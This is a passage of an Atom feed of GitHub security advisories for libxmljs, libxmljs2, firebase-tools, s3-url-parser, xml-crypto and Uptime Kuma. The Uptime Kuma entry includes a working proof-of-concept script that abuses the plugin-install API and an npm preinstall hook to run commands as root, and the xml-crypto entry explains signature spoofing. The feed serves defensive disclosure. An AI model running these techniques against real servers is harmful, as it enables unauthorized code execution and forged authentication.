<li><a href="https://github.com/advisories/GHSA-hfrv-h3q8-9jpr">https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrv-h3q8-9jpr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-03T20:30:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs] libxmljs vulnerable to type confusion when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-6433-x5p4-8jc7</id>
        <link href="https://github.com/advisories/GHSA-6433-x5p4-8jc7"/>
        <updated>2024-05-03T20:24:30.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking a function on the result of <code>attrs()</code> that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34391">https://nvd.nist.gov/vuln/detail/CVE-2024-34391</a></li>
<li><a href="https://github.com/libxmljs/libxmljs/issues/645">https://github.com/libxmljs/libxmljs/issues/645</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs-attrs-type-confusion-rce-jfsa-2024-001033988">https://research.jfrog.com/vulnerabilities/libxmljs-attrs-type-confusion-rce-jfsa-2024-001033988</a></li>
<li><a href="https://github.com/advisories/GHSA-6433-x5p4-8jc7">https://github.com/advisories/GHSA-6433-x5p4-8jc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6433-x5p4-8jc7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs2] libxmljs vulnerable to type confusion when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-78h3-pg4x-j8cv</id>
        <link href="https://github.com/advisories/GHSA-78h3-pg4x-j8cv"/>
        <updated>2024-05-03T20:24:18.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs2 is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the <code>namespaces()</code> function (which invokes <code>XmlNode::get_local_namespaces()</code>) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34394">https://nvd.nist.gov/vuln/detail/CVE-2024-34394</a></li>
<li><a href="https://github.com/marudor/libxmljs2/issues/205">https://github.com/marudor/libxmljs2/issues/205</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098">https://research.jfrog.com/vulnerabilities/libxmljs2-namespaces-type-confusion-rce-jfsa-2024-001034098</a></li>
<li><a href="https://github.com/advisories/GHSA-78h3-pg4x-j8cv">https://github.com/advisories/GHSA-78h3-pg4x-j8cv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78h3-pg4x-j8cv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs] libxmljs vulnerable to type confusion when parsing specially crafted XML ]]></title>
        <id>https://github.com/advisories/GHSA-mg49-jqgw-gcj6</id>
        <link href="https://github.com/advisories/GHSA-mg49-jqgw-gcj6"/>
        <updated>2024-05-03T20:24:05.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking the <code>namespaces()</code> function (which invokes <code>_wrap__xmlNode_nsDef_get()</code>) on a grand-child of a node that refers to an entity. This vulnerability can lead to denial of service and remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34392">https://nvd.nist.gov/vuln/detail/CVE-2024-34392</a></li>
<li><a href="https://github.com/libxmljs/libxmljs/issues/646">https://github.com/libxmljs/libxmljs/issues/646</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs-namespaces-type-confusion-rce-jfsa-2024-001034096">https://research.jfrog.com/vulnerabilities/libxmljs-namespaces-type-confusion-rce-jfsa-2024-001034096</a></li>
<li><a href="https://github.com/advisories/GHSA-mg49-jqgw-gcj6">https://github.com/advisories/GHSA-mg49-jqgw-gcj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg49-jqgw-gcj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[firebase-tools] Firebase vulnerable to CRSF attack]]></title>
        <id>https://github.com/advisories/GHSA-rcm2-22f3-pqv3</id>
        <link href="https://github.com/advisories/GHSA-rcm2-22f3-pqv3"/>
        <updated>2024-05-03T20:01:45.000Z</updated>
        <content type="html"><![CDATA[<p>This vulnerability was a potential CSRF attack.&nbsp;When running the Firebase emulator suite, there is an export endpoint that is used normally to export data from running emulators. If a user was running the emulator and navigated to a malicious website with the exploit on a browser that allowed calls to localhost (ie Chrome before v94), the website could exfiltrate emulator data. We recommend upgrading past version 13.6.0 or <a href="https://github.com/firebase/firebase-tools/commit/068a2b08dc308c7ab4b569617f5fc8821237e3a0">commit&nbsp;068a2b08dc308c7ab4b569617f5fc8821237e3a0</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4128">https://nvd.nist.gov/vuln/detail/CVE-2024-4128</a></li>
<li><a href="https://github.com/firebase/firebase-tools/pull/6944">https://github.com/firebase/firebase-tools/pull/6944</a></li>
<li><a href="https://github.com/firebase/firebase-tools/commit/068a2b08dc308c7ab4b569617f5fc8821237e3a0">https://github.com/firebase/firebase-tools/commit/068a2b08dc308c7ab4b569617f5fc8821237e3a0</a></li>
<li><a href="https://github.com/advisories/GHSA-rcm2-22f3-pqv3">https://github.com/advisories/GHSA-rcm2-22f3-pqv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcm2-22f3-pqv3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-05-02T15:30:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libxmljs2] libxmljs2 type confusion vulnerability when parsing specially crafted XML]]></title>
        <id>https://github.com/advisories/GHSA-mjr4-7xg5-pfvh</id>
        <link href="https://github.com/advisories/GHSA-mjr4-7xg5-pfvh"/>
        <updated>2024-05-03T17:33:01.000Z</updated>
        <content type="html"><![CDATA[<p>libxmljs2 is vulnerable to type confusion when parsing a specially crafted XML while invoking a function on the result of attrs() that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled). At the time of publication, there is no fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34393">https://nvd.nist.gov/vuln/detail/CVE-2024-34393</a></li>
<li><a href="https://github.com/marudor/libxmljs2/issues/204">https://github.com/marudor/libxmljs2/issues/204</a></li>
<li><a href="https://research.jfrog.com/vulnerabilities/libxmljs2-attrs-type-confusion-rce-jfsa-2024-001034097">https://research.jfrog.com/vulnerabilities/libxmljs2-attrs-type-confusion-rce-jfsa-2024-001034097</a></li>
<li><a href="https://github.com/advisories/GHSA-mjr4-7xg5-pfvh">https://github.com/advisories/GHSA-mjr4-7xg5-pfvh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mjr4-7xg5-pfvh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-02T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s3-url-parser] s3-url-parser vulnerable to Denial of Service via regexes component]]></title>
        <id>https://github.com/advisories/GHSA-r4q9-xx5g-j24p</id>
        <link href="https://github.com/advisories/GHSA-r4q9-xx5g-j24p"/>
        <updated>2024-05-03T17:32:01.000Z</updated>
        <content type="html"><![CDATA[<p>s3-url-parser 1.0.3 is vulnerable to denial of service via the regexes component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25355">https://nvd.nist.gov/vuln/detail/CVE-2024-25355</a></li>
<li><a href="https://gist.github.com/6en6ar/a4977866c59cbcfc716f0f2717b812bf">https://gist.github.com/6en6ar/a4977866c59cbcfc716f0f2717b812bf</a></li>
<li><a href="https://github.com/AntonioRecaldeRusso/s3-url-parser/blob/master/index.js">https://github.com/AntonioRecaldeRusso/s3-url-parser/blob/master/index.js</a></li>
<li><a href="https://github.com/advisories/GHSA-r4q9-xx5g-j24p">https://github.com/advisories/GHSA-r4q9-xx5g-j24p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r4q9-xx5g-j24p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-01T21:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xml-crypto] xml-crypto vulnerable to XML signature verification bypass due improper verification of signature/signature spoofing]]></title>
        <id>https://github.com/advisories/GHSA-2xp3-57p7-qf4v</id>
        <link href="https://github.com/advisories/GHSA-2xp3-57p7-qf4v"/>
        <updated>2024-05-02T19:35:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Default configuration does not check authorization of the signer, it only checks the validity of the signature per section 3.2.2 of <a href="https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation">https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation</a>. As such, without additional validation steps, the default configuration allows a malicious actor to re-sign an XML document, place the certificate in a <code>&lt;KeyInfo /&gt;</code> element, and pass <code>xml-crypto</code> default validation checks.</p>
<h3 id="details">Details</h3>
<p>Affected <code>xml-crypto</code> versions between versions <code>&gt;= 4.0.0</code> and <code>&lt; 6.0.0</code>. </p>
<p><code>xml-crypto</code> trusts by default any certificate provided via digitally signed XML document's <code>&lt;KeyInfo /&gt;</code>.</p>
<p><code>xml-crypto</code> prefers to use any certificate provided via digitally signed XML document's <code>&lt;KeyInfo /&gt;</code> even if library was configured to use specific certificate (<code>publicCert</code>) for signature verification purposes.</p>
<p>Attacker can spoof signature verification by modifying XML document and replacing existing signature with signature generated with malicious private key (created by attacker) and by attaching that private key's certificate to <code>&lt;KeyInfo /&gt;</code> element.</p>
<p>Vulnerability is combination of changes introduced to <code>4.0.0</code> at</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/pull/301">https://github.com/node-saml/xml-crypto/pull/301</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca">https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca</a></li>
</ul>
<p>Changes at PR provided default method to extract certificate from signed XML document.</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L405-L414">https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L405-L414</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L334">https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L334</a></li>
</ul>
<p>and changes at PR prefer output of that method to be used as certificate for signature verification even in the case when library is configured to use specific/pre-configured <code>signingCert</code></p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L507">https://github.com/node-saml/xml-crypto/blob/c2b83f984049edb68ad1d7c6ad0739ec92af11ca/lib/signed-xml.js#L507</a></li>
</ul>
<p>Name of the <code>signingCert</code> was changed later (but prior to <code>4.0.0</code> release) to <code>publicCert</code>:</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/commit/78329fbae34c9b25ba25882604e960f506d7c0e7">https://github.com/node-saml/xml-crypto/commit/78329fbae34c9b25ba25882604e960f506d7c0e7</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/blob/78329fbae34c9b25ba25882604e960f506d7c0e7/lib/signed-xml.js#L507">https://github.com/node-saml/xml-crypto/blob/78329fbae34c9b25ba25882604e960f506d7c0e7/lib/signed-xml.js#L507</a></li>
</ul>
<p>Issue was fixed to <code>6.0.0</code> by disabling implicit usage of default <code>getCertFromKeyInfo</code> implementation:</p>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/pull/445">https://github.com/node-saml/xml-crypto/pull/445</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000">https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000</a></li>
</ul>
<p>Possible workarounds for versions 4.x and 5.x:</p>
<ul>
<li>Check the certificate extracted via <code>getCertFromKeyInfo</code> against trusted certificates before accepting the results of the validation.</li>
<li>Set <code>xml-crypto</code>'s <code>getCertFromKeyInfo</code> to <code>() =&gt; undefined</code> forcing <code>xml-crypto</code> to use an explicitly configured <code>publicCert</code> or <code>privateKey</code> for signature verification.</li>
</ul>
<h3 id="poc">PoC</h3>
<p><a href="https://github.com/node-saml/xml-crypto/discussions/399">https://github.com/node-saml/xml-crypto/discussions/399</a></p>
<h3 id="impact">Impact</h3>
<p>An untrusted certificate can be used to pass a malicious XML payload through an improperly configured installation of <code>xml-crypto</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-2xp3-57p7-qf4v">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-2xp3-57p7-qf4v</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/pull/301">https://github.com/node-saml/xml-crypto/pull/301</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/pull/445">https://github.com/node-saml/xml-crypto/pull/445</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000">https://github.com/node-saml/xml-crypto/commit/21201723d2ca9bc11288f62cf72552b7d659b000</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca">https://github.com/node-saml/xml-crypto/commit/c2b83f984049edb68ad1d7c6ad0739ec92af11ca</a></li>
<li><a href="https://github.com/node-saml/xml-crypto/discussions/399">https://github.com/node-saml/xml-crypto/discussions/399</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32962">https://nvd.nist.gov/vuln/detail/CVE-2024-32962</a></li>
<li><a href="https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation">https://www.w3.org/TR/2008/REC-xmldsig-core-20080610/#sec-CoreValidation</a></li>
<li><a href="https://github.com/advisories/GHSA-2xp3-57p7-qf4v">https://github.com/advisories/GHSA-2xp3-57p7-qf4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2xp3-57p7-qf4v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-05-01T17:05:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma vulnerable to authenticated remote code execution via malicious plugin installation]]></title>
        <id>https://github.com/advisories/GHSA-7grx-f945-mj96</id>
        <link href="https://github.com/advisories/GHSA-7grx-f945-mj96"/>
        <updated>2024-05-01T10:01:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Installation of a maliciously crafted plugin allows for remote code execution by an authenticated attacker.</p>
<h3 id="details">Details</h3>
<p>Uptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.
After downloading a plugin, it's installed by calling <code>npm install</code> in the installation directory of the plugin:
<a href="https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216">https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216</a></p>
<p>Because the plugin is not validated against the official list of plugins or installed with <code>npm install --ignore-scripts</code>, a maliciously crafted plugin taking advantage of <a href="https://docs.npmjs.com/cli/v9/using-npm/scripts">npm scripts</a> can gain remote code execution.</p>
<h3 id="poc">PoC</h3>
<p>In the PoC below, the plugin at <a href="https://github.com/n-thumann/npm-install-script-poc">https://github.com/n-thumann/npm-install-script-poc</a> will be installed. It only consists of an empty <code>index.js</code> and a <code>package.json</code> containing the script: <code>"preinstall": "echo \"Malicious code could have been executed as user $(whoami)\" &gt; /tmp/poc"</code>. This will be executed when installing the plugin.</p>
<ol>
<li>Start Uptime Kuma: <code>docker run -d -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1</code></li>
<li>Create a user using the Uptime Kuma web interface, e.g. user <code>admin</code> with password <code>admin123</code></li>
<li>Confirm that the PoC file to be created doesn't exist yet:</li>
</ol>
<pre><code>➜  ~ docker exec -it uptime-kuma cat /tmp/poc
cat: /tmp/poc: No such file or directory
</code></pre>
<ol start="4">
<li>Create file <code>poc.js</code> with the following content:</li>
</ol>
<pre><code>SERVER = "ws://localhost:3001";
USERNAME = "admin";
PASSWORD = "admin123";


const { io } = require("socket.io-client");
const socket = io(SERVER);
const repo = "https://github.com/n-thumann/npm-install-script-poc";
const name = "npm-install-script-poc";

socket.emit(
  "login",
  { username: USERNAME, password: PASSWORD, token: "" },
  (res) =&gt; {
    if (res.ok !== true) return console.log("Login failed");

    console.log("Login successful");
    socket.emit("installPlugin", repo, name, () =&gt; {
      console.log("Done");
      socket.close();
    });
  }
);
</code></pre>
<ol start="5">
<li>Install <code>socket.io-client</code>: <code>npm install socket.io-client</code></li>
<li>Run the script: <code>node poc.js</code>:</li>
</ol>
<pre><code># node poc.js
Login successful
Done
</code></pre>
<ol start="7">
<li>The PoC file has been created:</li>
</ol>
<pre><code>➜  ~ docker exec -it uptime-kuma cat /tmp/poc
Malicious code could have been executed as user root
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows authenticated attacker to gain remote code execution on the server Uptime Kuma is running on.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-7grx-f945-mj96">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-7grx-f945-mj96</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36821">https://nvd.nist.gov/vuln/detail/CVE-2023-36821</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/3346">https://github.com/louislam/uptime-kuma/pull/3346</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b">https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216">https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.22.1">https://github.com/louislam/uptime-kuma/releases/tag/1.22.1</a></li>
<li><a href="https://github.com/advisories/GHSA-7grx-f945-mj96">https://github.com/advisories/GHSA-7grx-f945-mj96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7grx-f945-mj96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-01T10:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma's authenticated path traversal via plugin repository name may lead to unavailability or data loss]]></title>
        <id>https://github.com/advisories/GHSA-vr8x-74pm-6vj7</id>
        <link href="https://github.com/advisories/GHSA-vr8x-74pm-6vj7"/>
        <updated>2024-05-01T10:01:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A path traversal vulnerability via the plugin repository name allows an authenticated attacker to delete files on the server leading to unavailability and potentially data loss.</p>
<h3 id="details">Details</h3>
<p>Uptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.
Before a plugin is downloaded, the plugin installation directory is checked for existence. If it exists, it's removed before the plugin installation.</p>
<p>Because the plugin is not validated against the official list of plugins or sanitized, the check for existence and the removal of the plugin installation directory are prone to path traversal.</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an authenticated attacker to delete files from the server Uptime Kuma is running on.
Depending on which files are deleted, Uptime Kuma or the whole system may become unavailable due to data loss.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-vr8x-74pm-6vj7">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-vr8x-74pm-6vj7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36822">https://nvd.nist.gov/vuln/detail/CVE-2023-36822</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/3346">https://github.com/louislam/uptime-kuma/pull/3346</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b">https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/blob/de74efb2e6601dcbcfed32cddefc4078a80fcb0b/server/plugins-manager.js#L75-L80">https://github.com/louislam/uptime-kuma/blob/de74efb2e6601dcbcfed32cddefc4078a80fcb0b/server/plugins-manager.js#L75-L80</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.22.1">https://github.com/louislam/uptime-kuma/releases/tag/1.22.1</a></li>
<li><a href="https://github.com/advisories/GHSA-vr8x-74pm-6vj7">https://github.com/advisories/GHSA-vr8x-74pm-6vj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vr8x-74pm-6vj7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-01T10:01:02.000Z</published>
    </entry>
</feed>